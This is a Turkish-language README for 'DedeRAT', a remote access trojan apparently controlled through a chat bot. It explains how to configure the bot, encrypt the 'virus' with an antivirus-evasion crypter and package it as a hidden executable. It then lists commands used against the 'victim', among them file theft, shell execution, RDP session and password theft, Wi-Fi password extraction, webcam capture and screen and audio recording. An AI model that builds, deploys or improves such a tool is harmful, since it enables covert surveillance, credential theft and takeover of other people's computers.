# DedeRAT

Bu RAT, Türk mitolojisinden Dede Korkut'tan esinlenerek yapılmıştır. İlk RAT projemdir. Umarım beğenirsiniz.

# Kurulum

- Git veya zip olarak indirin.
- 'config.py' dosyasını bir metin düzenleyicide açın.
- "serverid" ve "bottoken" değerlerini kendi bilgilerinize göre değiştirin.
- "NMSFUD" klasörünü açın ve "NMSFUD V3.5" dosyasını açın. Python dosyasını seçip virüsünüzü şifreleyin.
- PyInstaller kullanarak exe dosyasına dönüştürün (iconpack içindeki simgeleri kullanabilirsiniz).

## Komut Örnekleri

pyinstaller --onefile --noconsole -i util/iconspack/iconname.ico -n virus config.py

pyinstaller --onefile --noconsole -n virus config.py

pyinstaller --onefile --noconsole config.py

# Komutlar

- **cd** - Dizin değiştirir. Kullanım: cd C:\tam\yol\of\directory
- **pwd** - Mevcut dizini gösterir.
- **delet** - Bir dosyayı siler.
- **download** - Kurbanın bilgisayarından bir dosyayı indirir. Kullanım: download C:\tam\yol\of\directory
- **msgbox** - Bir mesaj kutusu gösterir. Kullanım: msgbox -msg Mesaj -ttl Başlık
- **record** - Belirtilen süre kadar kayıt yapar. Kullanım: record 10 (10, saniye sayısıdır)
- **setbg** - Bir fotoğraf yükleyerek arka planı değiştirir.
- **shell** - CMD komutlarını çalıştırır. Kullanım: shell dir
- **ss** - Ekran görüntüsü alır.
- **stealrdp** - RDP oturum bilgilerini çalar.
- **sysinfo** - Sistem bilgilerini okur.
- **upload** - Kurbanın bilgisayarına bir dosya yükler. Kullanım: upload C:\tam\yol\of\your\wish (bir dosya ekleyin)
- **capsrandtroll** - Metin büyük/küçük harflerini rastgele değiştirir. Kullanım: capsrandtroll 10 (10, saniye sayısıdır)
- **visitsite** - Belirtilen siteyi ziyaret eder.
- **shutdown** - Kurbanın bilgisayarını kapatır.
- **tasklist** - Kurbanın PC'sindeki açık programları listeler.
- **taskkill** - Kurbanın PC'sindeki bir programı veya oyunu kapatır.
- **write** - Kurbanın PC'sine bir cümle yazar.
- **moveto** - Kurbanın farenizi hareket ettirir. Kullanım: moveto 100, 300 (100 ve 300, x ve y koordinatlarıdır)
- **webcamlist** - Mevcut web kameraları listeler.
- **cameraphoto** - Web kameradan bir fotoğraf çeker.
- **execute** - Bir dosyayı çalıştırır. Kullanım: execute <path>
- **recordvideo** - Belirtilen süre kadar video kaydeder. Kullanım: recordvideo 10.0 (10.0, süreyi saniye olarak belirtir)
- **wifipasswords** - Kaydedilen Wi-Fi ağlarını ve şifrelerini listeler.
- **grab** - Kurbanın şifrelerini çeker.

# Teşekkürler:

- LydexCoding
- NMS
- Basfroxy
- LyrexEx
